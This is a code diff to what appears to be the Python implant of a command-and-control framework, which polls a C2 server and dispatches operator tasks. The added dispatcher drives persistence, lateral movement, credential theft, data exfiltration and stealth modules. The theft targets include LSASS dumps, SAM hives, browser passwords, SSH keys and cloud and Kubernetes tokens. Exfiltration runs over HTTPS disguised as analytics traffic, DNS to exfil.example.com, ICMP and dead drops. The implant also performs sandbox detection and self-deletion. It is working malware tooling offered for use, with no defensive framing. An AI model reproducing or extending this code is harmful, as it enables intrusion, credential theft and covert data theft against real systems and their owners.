@@ -1,6 +1,11 @@
 import asyncio, json, os, platform, hashlib, time, uuid, base64, sys, re
 from crypto import decrypt, generate_keypair
 import httpx
+from modules.persistence import Persistence
+from modules.lateral import LateralMovement
+from modules.credtheft import CredentialTheft
+from modules.exfil import Exfiltration
+from stealth import Stealth as AdvancedStealth
 
 C2_URL = os.getenv("C2_URL", "http://c2-server:8081")
 INTERVAL = 30
@@ -89,121 +94,152 @@ async def execute_task(task: dict) -> dict:
     elif ttype == "sleep":
         await asyncio.sleep(payload.get("duration", 3600))
         return {"slept": True}
-        elif ttype == "uninstall":
-            confirm = payload.get("confirm_uninstall", False)
-            if not confirm:
-                return {"error": "uninstall requires confirm_uninstall: true"}
-            import shutil
+    elif ttype == "uninstall":
+        confirm = payload.get("confirm_uninstall", False)
+        if not confirm:
+            return {"error": "uninstall requires confirm_uninstall: true"}
+        import shutil
+        try:
+            shutil.rmtree(os.path.dirname(os.path.abspath(__file__)), ignore_errors=True)
+        except Exception:
+            pass
+        os._exit(0)
+    elif ttype == "persistence":
+        method = payload.get("method", "install_all")
+        if method == "install_all":
+            result = Persistence.install_all()
+        elif method == "systemd":
+            result = [("systemd", Persistence.install_systemd())]
+        elif method == "cron":
+            result = [("cron", Persistence.install_cron())]
+        elif method == "ld_preload":
+            result = [("ld_preload", Persistence.install_ld_preload())]
+        elif method == "registry":
+            result = [("registry", Persistence.install_registry_run())]
+        elif method == "scheduled_task":
+            result = [("scheduled_task", Persistence.install_scheduled_task())]
+        elif method == "wmi_event":
+            result = [("wmi_event", Persistence.install_wmi_event())]
+        elif method == "ssh_key":
+            result = [("ssh_key", Persistence.install_ssh_key(payload.get("public_key")))]
+        else:
+            result = [("error", {"status": False, "detail": f"Unknown persistence method: {method}"})]
+        return {"results": result}
+
+    elif ttype == "lateral":
+        method = payload.get("method", "autonomous")
+        target = payload.get("target")
+        username = payload.get("username", "root")
+        password = payload.get("password", "")
+        hash = payload.get("hash")
+        cmd = payload.get("command")
+
+        if method == "autonomous":
+            result = asyncio.run(LateralMovement.autonomous_campaign(
+                targets=payload.get("targets"),
+            ))
+        elif method == "ssh":
+            result = asyncio.run(LateralMovement.ssh(target, username, password, cmd))
+        elif method == "wmi":
+            result = asyncio.run(LateralMovement.wmi(target, username, password, hash, cmd))
+        elif method == "psexec":
+            binary_b64 = payload.get("binary_b64")
+            binary = base64.b64decode(binary_b64) if binary_b64 else None
+            result = asyncio.run(LateralMovement.psexec(target, username, password, hash, binary))
+        elif method == "smb":
+            result = asyncio.run(LateralMovement.smb_exec(target, username, password, hash, cmd))
+        elif method == "docker":
+            result = asyncio.run(LateralMovement.docker_socket(target))
+        elif method == "harvest":
+            result = LateralMovement._harvest_credentials()
+            result["_method"] = "credential_harvest"
+        else:
+            result = {"status": False, "detail": f"Unknown lateral method: {method}"}
+        return {"result": result}
+
+    elif ttype == "credtheft":
+        method = payload.get("method", "steal_all")
+        if method == "steal_all":
+            result = CredentialTheft.steal_all()
+        elif method == "browsers":
+            result = CredentialTheft.steal_browser_credentials()
+        elif method == "lsass":
+            result = CredentialTheft.steal_lsass_dump()
+        elif method == "sam":
+            result = CredentialTheft.steal_sam_hives()
+        elif method == "ssh":
+            result = CredentialTheft.steal_ssh_keys()
+        elif method == "kubernetes":
+            result = CredentialTheft.steal_kubernetes_tokens()
+        elif method == "cloud":
+            result = CredentialTheft.steal_cloud_credentials()
+        elif method == "env":
+            result = CredentialTheft.steal_env_vars()
+        elif method == "configs":
+            result = CredentialTheft.steal_config_files()
+        else:
+            result = {"status": False, "detail": f"Unknown credtheft method: {method}"}
+        return {"result": result}
+
+    elif ttype == "exfil":
+        method = payload.get("method", "https")
+        data_raw = payload.get("data")
+        if isinstance(data_raw, str):
             try:
-                shutil.rmtree(os.path.dirname(os.path.abspath(__file__)), ignore_errors=True)
+                data_bytes = base64.b64decode(data_raw)
             except Exception:
-                pass
-            os._exit(0)
-        elif ttype == "persistence":
-            method = payload.get("method", "install_all")
-            if method == "install_all":
-                result = Persistence.install_all()
-            elif method == "systemd":
-                result = [("systemd", Persistence.install_systemd())]
-            elif method == "cron":
-                result = [("cron", Persistence.install_cron())]
-            elif method == "ld_preload":
-                result = [("ld_preload", Persistence.install_ld_preload())]
-            elif method == "registry":
-                result = [("registry", Persistence.install_registry_run())]
-            elif method == "scheduled_task":
-                result = [("scheduled_task", Persistence.install_scheduled_task())]
-            elif method == "wmi_event":
-                result = [("wmi_event", Persistence.install_wmi_event())]
-            elif method == "ssh_key":
-                result = [("ssh_key", Persistence.install_ssh_key(payload.get("public_key")))]
-            else:
-                result = [("error", {"status": False, "detail": f"Unknown persistence method: {method}"})]
-            return {"results": result}
-        elif ttype == "lateral":
-            method = payload.get("method", "autonomous")
-            target = payload.get("target")
-            username = payload.get("username", "root")
-            password = payload.get("password", "")
-            hash_val = payload.get("hash")
-            cmd = payload.get("command")
-            if method == "autonomous":
-                result = asyncio.run(LateralMovement.autonomous_campaign(targets=payload.get("targets")))
-            elif method == "ssh":
-                result = asyncio.run(LateralMovement.ssh(target, username, password, cmd))
-            elif method == "wmi":
-                result = asyncio.run(LateralMovement.wmi(target, username, password, hash_val, cmd))
-            elif method == "psexec":
-                binary_b64 = payload.get("binary_b64")
-                binary = base64.b64decode(binary_b64) if binary_b64 else None
-                result = asyncio.run(LateralMovement.psexec(target, username, password, hash_val, binary))
-            elif method == "smb":
-                result = asyncio.run(LateralMovement.smb_exec(target, username, password, hash_val, cmd))
-            elif method == "docker":
-                result = asyncio.run(LateralMovement.docker_socket(target))
-            elif method == "harvest":
-                result = LateralMovement._harvest_credentials()
-                result["_method"] = "credential_harvest"
-            else:
-                result = {"status": False, "detail": f"Unknown lateral method: {method}"}
-            return {"result": result}
-        elif ttype == "credtheft":
-            method = payload.get("method", "steal_all")
-            if method == "steal_all":
-                result = CredentialTheft.steal_all()
-            elif method == "browsers":
-                result = CredentialTheft.steal_browser_credentials()
-            elif method == "lsass":
-                result = CredentialTheft.steal_lsass_dump()
-            elif method == "sam":
-                result = CredentialTheft.steal_sam_hives()
-            elif method == "ssh":
-                result = CredentialTheft.steal_ssh_keys()
-            elif method == "kubernetes":
-                result = CredentialTheft.steal_kubernetes_tokens()
-            elif method == "cloud":
-                result = CredentialTheft.steal_cloud_credentials()
-            elif method == "env":
-                result = CredentialTheft.steal_env_vars()
-            elif method == "configs":
-                result = CredentialTheft.steal_config_files()
-            else:
-                result = {"status": False, "detail": f"Unknown credtheft method: {method}"}
-            return {"result": result}
-        elif ttype == "exfil":
-            method = payload.get("method", "https")
-            data_raw = payload.get("data")
-            if isinstance(data_raw, str):
-                try:
-                    data_bytes = base64.b64decode(data_raw)
-                except Exception:
-                    data_bytes = data_raw.encode()
-            else:
-                data_bytes = json.dumps(data_raw).encode()
-            config = payload.get("config", {})
-            if method == "https":
-                result = asyncio.run(Exfiltration.via_https(data_bytes, target_url=config.get("url", "https://localhost:9999/collect"), key=config.get("key"), camouflage_as=config.get("camouflage", "analytics")))
-            elif method == "dns":
-                result = asyncio.run(Exfiltration.via_dns(data_bytes, domain=config.get("domain", "exfil.example.com"), key=config.get("key")))
-            elif method == "icmp":
-                result = asyncio.run(Exfiltration.via_icmp(data_bytes, target_ip=config.get("target_ip", "10.0.0.1"), key=config.get("key")))
-            elif method == "deaddrop":
-                result = asyncio.run(Exfiltration.via_deaddrop(data_bytes, drop_urls=config.get("drop_urls", []), key=config.get("key")))
-            elif method == "cloud":
-                result = asyncio.run(Exfiltration.via_cloud(data_bytes, provider=config.get("provider", "aws"), bucket=config.get("bucket", ""), key=config.get("key"), credentials=config.get("credentials", {})))
-            elif method == "exfiltrate_all":
-                data_dict = payload.get("data_dict", {})
-                result = asyncio.run(Exfiltration.exfiltrate_all(data_dict, config))
-            else:
-                result = {"status": False, "detail": f"Unknown exfil method: {method}"}
-            return {"result": result}
-        elif ttype == "stealth_init":
-            result = AdvancedStealth.initialize_all()
-            return {"result": result}
-        elif ttype == "sandbox_check":
-            result = AdvancedStealth.sandbox_detect()
-            return {"result": result}
-        return {"error": f"unknown task type: {ttype}"}
+                data_bytes = data_raw.encode()
+        else:
+            data_bytes = json.dumps(data_raw).encode()
+
+        config = payload.get("config", {})
+
+        if method == "https":
+            result = asyncio.run(Exfiltration.via_https(
+                data_bytes,
+                target_url=config.get("url", "https://localhost:9999/collect"),
+                key=config.get("key"),
+                camouflage_as=config.get("camouflage", "analytics"),
+            ))
+        elif method == "dns":
+            result = asyncio.run(Exfiltration.via_dns(
+                data_bytes,
+                domain=config.get("domain", "exfil.example.com"),
+                key=config.get("key"),
+            ))
+        elif method == "icmp":
+            result = asyncio.run(Exfiltration.via_icmp(
+                data_bytes,
+                target_ip=config.get("target_ip", "10.0.0.1"),
+                key=config.get("key"),
+            ))
+        elif method == "deaddrop":
+            result = asyncio.run(Exfiltration.via_deaddrop(
+                data_bytes,
+                drop_urls=config.get("drop_urls", []),
+                key=config.get("key"),
+            ))
+        elif method == "cloud":
+            result = asyncio.run(Exfiltration.via_cloud(
+                data_bytes,
+                provider=config.get("provider", "aws"),
+                bucket=config.get("bucket", ""),
+                key=config.get("key"),
+                credentials=config.get("credentials", {}),
+            ))
+        else:
+            result = {"status": False, "detail": f"Unknown exfil method: {method}"}
+        return {"result": result}
+
+    elif ttype == "stealth_init":
+        result = AdvancedStealth.initialize_all()
+        return {"result": result}
+
+    elif ttype == "sandbox_check":
+        result = AdvancedStealth.sandbox_detect()
+        return {"result": result}
+
+    return {"error": f"unknown task type: {ttype}"}
 
 async def submit_result(agent_id: str, session_key: bytes, task_id: str, result: dict):
     redacted = {k: (_redact(v) if isinstance(v, str) else v) for k, v in result.items()}
